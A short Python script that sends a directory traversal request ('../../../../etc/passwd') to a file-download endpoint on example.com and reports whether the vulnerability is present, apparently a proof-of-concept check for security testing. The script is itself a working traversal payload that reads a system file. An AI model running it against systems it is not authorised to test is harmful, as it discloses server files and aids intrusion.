import requests

url = "http://example.com/files/download?file=../../../../etc/passwd"

response = requests.get(url)

if response.status_code == 200:
    if "root" in response.text:
        print("[+] Directory traversal vulnerability detected!")
    else:
        print("[-] Directory traversal vulnerability not found.")
else:
    print("[-] Failed to connect to target.")
